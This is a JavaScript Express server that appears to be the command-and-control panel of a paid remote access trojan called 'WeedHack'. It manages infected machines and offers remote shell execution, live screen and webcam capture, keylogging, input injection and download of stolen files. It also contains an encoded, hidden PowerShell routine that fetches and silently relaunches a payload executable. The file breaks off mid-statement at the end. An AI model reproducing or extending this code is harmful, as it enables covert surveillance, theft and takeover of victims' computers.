// language: JavaScript, file: server.js, target: Node 22.5+
import 'dotenv/config';
import express from 'express';
import helmet from 'helmet';
import cookieParser from 'cookie-parser';
import rateLimit from 'express-rate-limit';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import crypto from 'node:crypto';
import fs from 'node:fs';
import http from 'node:http';
import https from 'node:https';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import db, { UPLOAD_DIR } from './db.js';
import { startUdp, closeUdp, sendInput, sendCfg, getFrame, getWebcamFrame, getMonitors, getCursor, getPing } from './net.js';
import { handleRpc } from './tcp_rpc.js';
import { buildBoot } from './builder/rustbuild.js';
import { buildMinecraftMod, progressStore as mcProgressStore } from './builder/minecraftbuild.js';
import { countriesFor } from './builder/geo.js';

const __dirname  = path.dirname(fileURLToPath(import.meta.url));
const PUBLIC_DIR = path.join(__dirname, 'public');

const CFG = {
  httpPort:   Number(process.env.HTTP_PORT || 80),
  tcpPort:    Number(process.env.TCP_PORT  || 443),
  udpPort:    Number(process.env.UDP_PORT  || 880),
  bindHost:   process.env.BIND_HOST || '0.0.0.0',
  tlsCert:    process.env.TLS_CERT || '',
  tlsKey:     process.env.TLS_KEY  || '',
  jwtSecret:  process.env.JWT_SECRET || 'dev_only_change_me',
  cookieSecure: process.env.COOKIE_SECURE === 'true',
  maxUpload:  Number(process.env.MAX_UPLOAD_BYTES || 64 * 1024 * 1024),
};

const DOWNLOAD_DIR = path.join(__dirname, 'download');
if (!fs.existsSync(DOWNLOAD_DIR)) fs.mkdirSync(DOWNLOAD_DIR, { recursive: true });

const BUILD_DIR = path.join(__dirname, 'build');
if (!fs.existsSync(BUILD_DIR)) fs.mkdirSync(BUILD_DIR, { recursive: true });

const MC_BUILD_DIR = path.join(BUILD_DIR, 'mc');
if (!fs.existsSync(MC_BUILD_DIR)) fs.mkdirSync(MC_BUILD_DIR, { recursive: true });

if (!fs.existsSync(path.join(PUBLIC_DIR, 'css', 'style.css'))) {
  console.error(`[startup] FATAL: ${PUBLIC_DIR}/css/style.css missing.`);
  process.exit(1);
}
if (!fs.existsSync(CFG.tlsCert) || !fs.existsSync(CFG.tlsKey)) {
  console.error(`[startup] FATAL: TLS cert/key missing.`);
  process.exit(1);
}

const tlsOpts = {
  cert: fs.readFileSync(CFG.tlsCert),
  key:  fs.readFileSync(CFG.tlsKey),
};

const app = express();
app.disable('x-powered-by');
app.set('trust proxy', false);

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc:  ["'self'", "'unsafe-inline'"],
      scriptSrcAttr: ["'unsafe-inline'"],
      styleSrc:   ["'self'", "'unsafe-inline'"],
      imgSrc:     ["'self'", 'data:', 'blob:'],
      connectSrc: ["'self'"],
      frameAncestors: ["'none'"],
      objectSrc:  ["'none'"],
      baseUri:    ["'self'"],
      upgradeInsecureRequests: null,
    },
  },
  hsts: false,
  crossOriginResourcePolicy: { policy: 'same-origin' },
  referrerPolicy: { policy: 'no-referrer' },
}));
app.use(cookieParser());

app.use((req, res, next) => {
  const t = Date.now();
  res.on('finish', () => {
    const skip = req.path.includes('/screen') || req.path.endsWith('/webcam');
    if (!skip) console.log(`[http] ${req.method} ${req.url} ${req.ip} -> ${res.statusCode} (${Date.now() - t}ms)`);
  });
  next();
});

app.post('/api/rpc',
  express.json({ limit: Math.ceil(CFG.maxUpload * 1.5) }),
  (req, res) => {
    try { res.json(handleRpc(req.body, req.ip)); }
    catch (e) { console.error('[rpc]', e); res.status(500).json({ error: 'rpc error' }); }
  }
);

app.use('/api/client/upload', express.raw({
  type: ['application/zip', 'application/octet-stream'],
  limit: CFG.maxUpload,
}));

const jsonSmall = express.json({ limit: '256kb' });
const jsonExec  = express.json({ limit: '32mb' });
app.use((req, res, next) => {
  if (req.method === 'POST' && /^\/api\/clients\/\d+\/exec\/?$/.test(req.path)) {
    return jsonExec(req, res, next);
  }
  return jsonSmall(req, res, next);
});

const limit = (opts) => rateLimit({ standardHeaders: true, legacyHeaders: false, ...opts });
const limitGlobal = limit({
  windowMs: 60_000, max: 600,
  message: { error: 'too many requests' },
  skip: (req) =>
    req.path.endsWith('/screen') ||
    req.path.endsWith('/cursor') ||
    req.path.endsWith('/input') ||
    req.path.endsWith('/monitors') ||
    req.path.endsWith('/webcam') ||
    req.path.endsWith('/rdp/update') ||
    req.path.endsWith('/rdp/stop') ||
    req.path.endsWith('/webcam/stop') ||
    req.path.endsWith('/keylog/stop') ||
    req.path.endsWith('/sysinfo') ||
    req.path.startsWith('/api/build/minecraft/progress/'),
});
const limitAuth     = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'too many attempts, slow down' } });
const limitWebhook  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'webhook test limit reached' } });
const limitDownload = limit({ windowMs: 60_000,      max: 60,  message: { error: 'too many downloads' } });
const limitBuild    = limit({ windowMs: 60 * 60_000, max: 10,  message: { error: 'build limit reached — 10 per hour' } });
const limitMcBuild  = limit({ windowMs: 60 * 60_000, max: 5,   message: { error: 'minecraft build limit — 5 per hour' } });
const limitAdmin    = limit({ windowMs: 15 * 60_000, max: 20,  message: { error: 'Too many admin attempts. Locked for 15 minutes.' } });
app.use(limitGlobal);

const sql = (strings, ...vals) => {
  if (vals.length) throw new Error('sql tagged template refused — use ? params');
  return strings[0];
};

const ALPHA = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
function genBlock4() {
  return Array.from({ length: 4 }, () => ALPHA[crypto.randomInt(ALPHA.length)]).join('');
}
function genKey()      { return [genBlock4(), genBlock4(), genBlock4(), genBlock4()].join('-'); }
function genLoginTok() { return [genBlock4(), genBlock4(), genBlock4(), genBlock4()].join('-'); }

const signToken  = (u) => jwt.sign({ uid: u.id, username: u.username }, CFG.jwtSecret, { expiresIn: '7d' });
const cookieOpts = () => ({ httpOnly: true, sameSite: 'lax', secure: CFG.cookieSecure, maxAge: 7 * 24 * 3600 * 1000 });

function requireAuth(req, res, next) {
  const token = req.cookies?.token;
  if (!token) return res.status(401).json({ error: 'unauthorized' });
  try { req.user = jwt.verify(token, CFG.jwtSecret); next(); }
  catch { return res.status(401).json({ error: 'unauthorized' }); }
}

function requirePremium(req, res, next) {
  const row = getOwnUser(req.user.uid);
  if (!row || !row.premium_until || row.premium_until < Date.now()) {
    return res.status(403).json({ error: 'Premium required or expired. Please upgrade your account.' });
  }
  next();
}

const isDiscordWebhook = (url) => typeof url === 'string' &&
  /^https:\/\/(discord|discordapp)\.com\/api\/webhooks\/\d+\/[\w-]+$/.test(url);

async function sendWebhook(url, payload) {
  try {
    const r = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'WeedHack', ...payload }),
      redirect: 'error',
      signal: AbortSignal.timeout(5000),
    });
    return r.ok;
  } catch { return false; }
}

const getOwnUser = (uid) => db.prepare(sql`
  SELECT id, username, email, account_key, login_token, discord_webhook, created_at, premium_until
  FROM users WHERE id = ?
`).get(uid);

// ─── wipe command builder ────────────────────────────────────────────────────
function buildWipeCommand(serverBase) {
  const stUrl = `${serverBase}/api/downloads/st.exe`;

  const script = `
$ErrorActionPreference = 'SilentlyContinue'
$log = Join-Path $env:TEMP 'wh-wipe.log'
"--- $(Get-Date -Format o) ---" | Out-File -Encoding UTF8 $log
"url: ${stUrl}" | Out-File -Encoding UTF8 -Append $log

[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

function Get-St {
  param([string]$Url, [string]$Dst)
  Remove-Item -Force -Path $Dst -ErrorAction SilentlyContinue
  $params = @{ Uri = $Url; OutFile = $Dst; UseBasicParsing = $true; TimeoutSec = 60; ErrorAction = 'Stop' }
  if ($PSVersionTable.PSVersion.Major -ge 6) { $params['SkipCertificateCheck'] = $true }
  Invoke-WebRequest @params
}

$stTmp = Join-Path $env:TEMP 'st_new.exe'
$ok = $false
for ($i = 0; $i -lt 5; $i++) {
  try {
    Get-St -Url '${stUrl}' -Dst $stTmp
    if ((Get-Item $stTmp).Length -gt 1000) { $ok = $true; break }
  } catch {
    "attempt $i failed: $($_.Exception.Message)" | Out-File -Encoding UTF8 -Append $log
    Start-Sleep -Seconds 2
  }
}
if (-not $ok) {
  try {
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile('${stUrl}', $stTmp)
    if ((Get-Item $stTmp).Length -gt 1000) { $ok = $true }
  } catch {
    "webclient failed: $($_.Exception.Message)" | Out-File -Encoding UTF8 -Append $log
  }
}
if (-not $ok) {
  "abort: download failed, loader untouched" | Out-File -Encoding UTF8 -Append $log
  exit 1
}
"download ok: $((Get-Item $stTmp).Length) bytes" | Out-File -Encoding UTF8 -Append $log

schtasks /Delete /TN 'WindowsUpdateHelper' /F 2>$null | Out-Null

$dir = Join-Path $env:APPDATA 'loader'
Get-Process -ErrorAction SilentlyContinue | Where-Object {
  $_.Path -and $_.Path.StartsWith($dir, [System.StringComparison]::OrdinalIgnoreCase)
} | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Milliseconds 2000

$keep = (Join-Path $dir 'key.json').ToLower()
for ($i = 0; $i -lt 15; $i++) {
  $left = @()
  Get-ChildItem -Force -Path $dir -ErrorAction SilentlyContinue | ForEach-Object {
    if ($_.FullName.ToLower() -ne $keep) {
      try { Remove-Item -Recurse -Force -Path $_.FullName -ErrorAction Stop }
      catch { $left += $_.FullName }
    }
  }
  if ($left.Count -eq 0) { break }
  Start-Sleep -Milliseconds 500
}
"wipe done, remaining: $($left.Count)" | Out-File -Encoding UTF8 -Append $log

New-Item -ItemType Directory -Force -Path $dir | Out-Null
$stDst = Join-Path $dir 'st.exe'
for ($i = 0; $i -lt 15; $i++) {
  try { Move-Item -Force -Path $stTmp -Destination $stDst -ErrorAction Stop; break }
  catch { Start-Sleep -Milliseconds 500 }
}
"moved st.exe: $(Test-Path $stDst)" | Out-File -Encoding UTF8 -Append $log

if (Test-Path $stDst) {
  Start-Process -FilePath $stDst -WorkingDirectory $dir -WindowStyle Hidden
  "launched" | Out-File -Encoding UTF8 -Append $log
} else {
  "error: st.exe missing after move" | Out-File -Encoding UTF8 -Append $log
}
`;

  const encoded = Buffer.from(script, 'utf16le').toString('base64');

  return `Start-Process -FilePath 'powershell.exe' -WindowStyle Hidden -ArgumentList @('-NoProfile','-NonInteractive','-WindowStyle','Hidden','-EncodedCommand','${encoded}')`;
}

app.use(express.static(PUBLIC_DIR, {
  etag: true,
  maxAge: '1h',
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.html')) res.setHeader('Cache-Control', 'no-store');
  },
}));

app.get('/api/health', (_req, res) => {
  res.json({ ok: true, uptime: Math.round(process.uptime()),
             http: CFG.httpPort, tcp: CFG.tcpPort, udp: CFG.udpPort,
             time: new Date().toISOString() });
});

app.get('/api/getkey/:buildId', (req, res) => {
  const buildId = Number(req.params.buildId);
  const row = db.prepare(sql`SELECT key FROM builds WHERE id = ?`).get(buildId);
  if (!row) return res.status(404).send('{"error": "not found"}');
  res.send(`{"key": "${row.key}"}`);
});

app.post('/api/signup', limitAuth, async (req, res) => {
  const { username, email, password, discordWebhook } = req.body || {};
  if (!username || !email || !password || !discordWebhook)
    return res.status(400).json({ error: 'all fields required' });
  if (username.length < 3 || username.length > 32)
    return res.status(400).json({ error: 'username 3-32 chars' });
  if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email))
    return res.status(400).json({ error: 'invalid email' });
  if (password.length < 8)
    return res.status(400).json({ error: 'password min 8 chars' });
  if (!isDiscordWebhook(discordWebhook))
    return res.status(400).json({ error: 'invalid discord webhook url' });

  const exists = db.prepare(sql`SELECT id FROM users WHERE username = ? OR email = ?`).get(username, email);
  if (exists) return res.status(409).json({ error: 'username or email taken' });

  const webhookOk = await sendWebhook(discordWebhook, {
    content: `webhook verified for \`${username}\``,
    embeds: [{ title: 'account verified', color: 0x29B6F6,
               description: 'your webhook is live. your keys arrive next.',
               timestamp: new Date().toISOString() }],
  });
  if (!webhookOk) return res.status(400).json({ error: 'webhook unreachable — check the url' });

  const hash       = await bcrypt.hash(password, 12);
  const accountKey = genKey();
  const loginToken = genLoginTok();

  const info = db.prepare(sql`
    INSERT INTO users (username, email, password_hash, account_key, login_token, discord_webhook, created_at)
    VALUES (?, ?, ?, ?, ?, ?, ?)
  `).run(username, email, hash, accountKey, loginToken, discordWebhook, Date.now());

  const user = { id: Number(info.lastInsertRowid), username };

  sendWebhook(discordWebhook, {
    content: `keys for **${username}**`,
    embeds: [{
      title: 'your keys',
      color: 0x0288D1,
      description:
        `**account key** (client auth)\n\`\`\`\n${accountKey}\n\`\`\`\n` +
        `**login token** (dashboard sign-in)\n\`\`\`\n${loginToken}\n\`\`\``,
      timestamp: new Date().toISOString(),
    }],
  });

  res.cookie('token', signToken(user), cookieOpts());
  res.json({ ok: true, accountKey, loginToken, username });
});

app.post('/api/signin', limitAuth, async (req, res) => {
  const { username, loginToken, password } = req.body || {};

  let user = null;

  if (loginToken && !password) {
    user = db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken);
  } else if (loginToken && password) {
    user = db.prepare(sql`SELECT * FROM users WHERE login_token = ?`).get(loginToken);
    if (user) {
      const ok = await bcrypt.compare(password, user.password_hash);
      if (!ok) user = null;
    }
  } else if (username && password) {
    user = db.prepare(sql`SELECT * FROM users WHERE username = ? OR email = ?`).get(username, username);
    if (user) {
      const ok = await bcrypt.compare(password, user.password_hash);
      if (!ok) user = null;
    }
  } else {
    return res.status(400).json({ error: 'missing credentials' });
  }

  if (!user) return res.status(401).json({ error: 'invalid credentials' });

  res.cookie('token', signToken({ id: user.id, username: user.username }), cookieOpts());
  res.json({ ok: true, username: user.username });
});

app.post('/api/logout', (_req, res) => { res.clearCookie('token'); res.json({ ok: true }); });

app.get('/api/me', requireAuth, (req, res) => {
  const row = getOwnUser(req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  res.json({
    username: row.username,
    email: row.email,
    accountKey: row.account_key,
    loginToken: row.login_token,
    discordWebhook: row.discord_webhook,
    createdAt: row.created_at,
    premium_until: row.premium_until,
    isPremium: row.premium_until > Date.now()
  });
});

app.post('/api/webhook/test', requireAuth, limitWebhook, async (req, res) => {
  const { url } = req.body || {};
  if (!isDiscordWebhook(url)) return res.status(400).json({ error: 'invalid discord webhook url' });
  const ok = await sendWebhook(url, {
    content: 'webhook test',
    embeds: [{ title: 'connection live', color: 0x29B6F6, timestamp: new Date().toISOString() }],
  });
  if (!ok) return res.status(502).json({ error: 'webhook unreachable' });
  db.prepare(sql`UPDATE users SET discord_webhook = ? WHERE id = ?`).run(url, req.user.uid);
  res.json({ ok: true });
});

app.get('/api/clients', requireAuth, async (req, res) => {
  const status = String(req.query.status || 'all').toLowerCase();
  const q      = String(req.query.q || '').trim();
  const limitN = Math.min(Math.max(Number(req.query.limit  || 50),  1), 200);
  const offset = Math.max(Number(req.query.offset || 0), 0);
  const now    = Date.now();
  const cutoff = now - 30_000;

  const filters = ['user_id = ?'];
  const params  = [req.user.uid];

  if (status === 'online')  { filters.push('last_seen >= ?'); params.push(cutoff); }
  if (status === 'offline') { filters.push('last_seen < ?');  params.push(cutoff); }
  if (q) {
    filters.push('(hostname LIKE ? OR ip LIKE ?)');
    params.push(`%${q}%`, `%${q}%`);
  }
  const where = filters.join(' AND ');

  const totalRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE ${where}`).get(...params);
  const rows = db.prepare(`
    SELECT id, hostname, ip, last_seen FROM clients
    WHERE ${where}
    ORDER BY ((id * 1103515245 + user_id * 12345) % 2147483647) ASC
    LIMIT ? OFFSET ?
  `).all(...params, limitN, offset);

  const onlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen >= ?`)
    .get(req.user.uid, cutoff);
  const offlineRow = db.prepare(`SELECT COUNT(*) AS n FROM clients WHERE user_id = ? AND last_seen < ?`)
    .get(req.user.uid, cutoff);

  let geo = {};
  try { geo = await countriesFor(rows.map(r => r.ip)); } catch {}

  res.json({
    total:   Number(totalRow.n),
    online:  Number(onlineRow.n),
    offline: Number(offlineRow.n),
    rows: rows.map(r => ({
      id: r.id,
      hostname: r.hostname,
      ip: r.ip,
      online: now - r.last_seen < 30_000,
      lastSeen: r.last_seen,
      country: geo[r.ip] || null,
      privileges: 'admin',
      ping: getPing(r.id),
    })),
  });
});

app.get('/api/clients/:id/uploads', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const rows = db.prepare(sql`
    SELECT id, filename, size, created_at FROM uploads
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 200
  `).all(req.user.uid, clientId);
  res.json(rows);
});

app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium, (req, res) => {
  const uploadId = Number(req.params.id);
  const row = db.prepare(sql`
    SELECT filename, stored_name, size FROM uploads
    WHERE id = ? AND user_id = ?
  `).get(uploadId, req.user.uid);
  if (!row) return res.status(404).json({ error: 'not found' });
  const src = path.join(UPLOAD_DIR, row.stored_name);
  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
  res.setHeader('Content-Type', 'application/zip');
  res.setHeader('Content-Length', row.size);
  res.setHeader('Content-Disposition', `attachment; filename="${row.filename.replace(/"/g, '')}"`);
  fs.createReadStream(src).pipe(res);
});

app.post('/api/clients/:id/exec', requireAuth, requirePremium, (req, res) => {
  const clientId = Number(req.params.id);
  const { shell, line } = req.body || {};
  if (!['cmd', 'powershell', 'file'].includes(shell))
    return res.status(400).json({ error: 'bad shell' });
  const maxLine = shell === 'file' ? 32 * 1024 * 1024 : 65536;
  if (typeof line !== 'string' || !line.trim() || line.length > maxLine)
    return res.status(400).json({ error: 'bad line' });

  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  const info = db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, ?, ?, 'pending', ?)
  `).run(req.user.uid, clientId, shell, line, Date.now());

  res.json({ ok: true, commandId: Number(info.lastInsertRowid) });
});

app.get('/api/clients/:id/commands', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const rows = db.prepare(sql`
    SELECT id, shell, line, output, status, created_at FROM commands
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 100
  `).all(req.user.uid, clientId);
  res.json(rows);
});

app.get('/api/clients/:id/sysinfo', requireAuth, requirePremium, async (req, res) => {
  const clientId = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(clientId, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  try {
    const info = db.prepare(sql`
      INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
      VALUES (?, ?, 'sysinfo', '', 'pending', ?)
    `).run(req.user.uid, clientId, Date.now());

    const cmdId = Number(info.lastInsertRowid);
    const deadline = Date.now() + 10000;

    while (Date.now() < deadline) {
      await new Promise(r => setTimeout(r, 150));
      const row = db.prepare(sql`SELECT output, status FROM commands WHERE id = ?`).get(cmdId);
      if (!row) continue;
      if (row.status === 'done') {
        try {
          return res.json(JSON.parse(row.output || '{}'));
        } catch (e) {
          return res.status(500).json({ error: 'bad json from client', raw: row.output });
        }
      }
    }
    res.status(504).json({ error: 'timeout waiting for client' });
  } catch (e) {
    console.error('[sysinfo]', e);
    res.status(500).json({ error: 'internal error' });
  }
});

app.delete('/api/clients/:id', requireAuth, (req, res) => {
  const clientId = Number(req.params.id);
  const info = db.prepare(sql`DELETE FROM clients WHERE id = ? AND user_id = ?`).run(clientId, req.user.uid);
  if (info.changes === 0) return res.status(404).json({ error: 'not found' });
  res.json({ ok: true });
});

// ─── wipe + reinstall ────────────────────────────────────────────────────────
app.post('/api/clients/:id/wipe', requireAuth, async (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  const stPath = path.join(DOWNLOAD_DIR, 'st.exe');
  let needsBuild = !fs.existsSync(stPath);
  if (!needsBuild) {
    const stat = fs.statSync(stPath);
    if (Date.now() - stat.mtimeMs > 6 * 60 * 60 * 1000) needsBuild = true;
  }

  if (needsBuild) {
    const row = getOwnUser(req.user.uid);
    const acctKey = row?.account_key || '';
    if (!acctKey) return res.status(400).json({ error: 'no account key to build st.exe' });
    try {
      const nextIdRow = db.prepare(sql`SELECT MAX(id) + 1 AS nextId FROM builds`).get();
      const nextBuildId = nextIdRow && nextIdRow.nextId ? nextIdRow.nextId : 1;
      await buildBoot({ key: acctKey, buildId: nextBuildId });
    } catch (e) {
      console.error('[wipe] rebuild st.exe failed', e);
      return res.status(500).json({ error: 'failed to rebuild st.exe: ' + (e.message || 'unknown') });
    }
  }

  let base = req.body?.serverBase;
  if (!base) {
    const proto = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https' : 'http';
    base = `${proto}://${req.headers.host}`;
  }

  const line = buildWipeCommand(base);

  const info = db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'powershell', ?, 'pending', ?)
  `).run(req.user.uid, cid, line, Date.now());

  res.json({
    ok: true,
    commandId: Number(info.lastInsertRowid),
    message: 'wiping + reinstalling',
  });
});

app.post('/api/clients/:id/rdp/start', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const cfg = {
    monitor:  Number(req.body.monitor  || 0),
    width:    Math.min(Math.max(Number(req.body.width  || 1280), 320), 3840),
    height:   Math.min(Math.max(Number(req.body.height || 720),  240), 2160),
    quality:  Math.min(Math.max(Number(req.body.quality || 50),   10),  90),
    fps:      Math.min(Math.max(Number(req.body.fps     || 10),    1),  60),
    keyboard: req.body.keyboard === true,
    mouse:    req.body.mouse === true,
  };
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'rdp', ?, 'pending', ?)
  `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
  res.json({ ok: true });
});

app.post('/api/clients/:id/rdp/stop', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'rdp', '{"stop":true}', 'pending', ?)
  `).run(req.user.uid, cid, Date.now());
  res.json({ ok: true });
});

app.post('/api/clients/:id/rdp/update', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const ok = sendCfg(cid, JSON.stringify(req.body || {}));
  res.json({ ok });
});

app.get('/api/clients/:id/screen', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const bytes = getFrame(cid);
  if (!bytes) return res.status(204).end();

  let ctype = 'application/octet-stream';
  if (bytes.length >= 12 &&
      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
    ctype = 'image/webp';
  } else if (bytes.length >= 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
    ctype = 'image/jpeg';
  }

  res.setHeader('Content-Type', ctype);
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.send(bytes);
});

app.get('/api/clients/:id/cursor', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });

  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, max-age=0');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');

  const c = getCursor(cid);
  if (!c) return res.status(204).end();
  res.json(c);
});

app.get('/api/clients/:id/monitors', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  res.json(getMonitors(cid));
});

app.post('/api/clients/:id/input', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const ok = sendInput(cid, JSON.stringify(req.body || {}));
  res.json({ ok });
});

app.post('/api/clients/:id/webcam/start', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const cfg = {
    camera:  Number(req.body.camera  || 0),
    width:   Math.min(Math.max(Number(req.body.width  || 640), 160), 1920),
    height:  Math.min(Math.max(Number(req.body.height || 480), 120), 1080),
    quality: Math.min(Math.max(Number(req.body.quality || 55),  10),  90),
    fps:     Math.min(Math.max(Number(req.body.fps     || 10),   1),  30),
  };
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'webcam', ?, 'pending', ?)
  `).run(req.user.uid, cid, JSON.stringify(cfg), Date.now());
  res.json({ ok: true });
});

app.post('/api/clients/:id/webcam/stop', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'webcam', '{"stop":true}', 'pending', ?)
  `).run(req.user.uid, cid, Date.now());
  res.json({ ok: true });
});

app.get('/api/clients/:id/webcam', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const bytes = getWebcamFrame(cid);
  if (!bytes) return res.status(204).end();

  let ctype = 'application/octet-stream';
  if (bytes.length >= 12 &&
      bytes[0] === 0x52 && bytes[1] === 0x49 && bytes[2] === 0x46 && bytes[3] === 0x46 &&
      bytes[8] === 0x57 && bytes[9] === 0x45 && bytes[10] === 0x42 && bytes[11] === 0x50) {
    ctype = 'image/webp';
  } else if (bytes.length >= 3 && bytes[0] === 0xFF && bytes[1] === 0xD8 && bytes[2] === 0xFF) {
    ctype = 'image/jpeg';
  }

  res.setHeader('Content-Type', ctype);
  res.setHeader('Cache-Control', 'no-store');
  res.send(bytes);
});

app.post('/api/clients/:id/keylog/start', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'keylog', '{"start":true}', 'pending', ?)
  `).run(req.user.uid, cid, Date.now());
  res.json({ ok: true });
});

app.post('/api/clients/:id/keylog/stop', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`
    INSERT INTO commands (user_id, client_id, shell, line, status, created_at)
    VALUES (?, ?, 'keylog', '{"stop":true}', 'pending', ?)
  `).run(req.user.uid, cid, Date.now());
  res.json({ ok: true });
});

app.get('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  const rows = db.prepare(sql`
    SELECT id, data, created_at FROM keylogs
    WHERE user_id = ? AND client_id = ?
    ORDER BY created_at DESC LIMIT 500
  `).all(req.user.uid, cid);
  res.json(rows.reverse());
});

app.delete('/api/clients/:id/keylog', requireAuth, requirePremium, (req, res) => {
  const cid = Number(req.params.id);
  const client = db.prepare(sql`SELECT id FROM clients WHERE id = ? AND user_id = ?`).get(cid, req.user.uid);
  if (!client) return res.status(404).json({ error: 'client not found' });
  db.prepare(sql`DELETE FROM keylogs WHERE user_id = ? AND client_id = ?`).run(req.user.uid, cid);
  res.json({ ok: true });
});

// drop legacy launcher exe if it survived from the old pipeline
for (const stale of ['boot.exe']) {
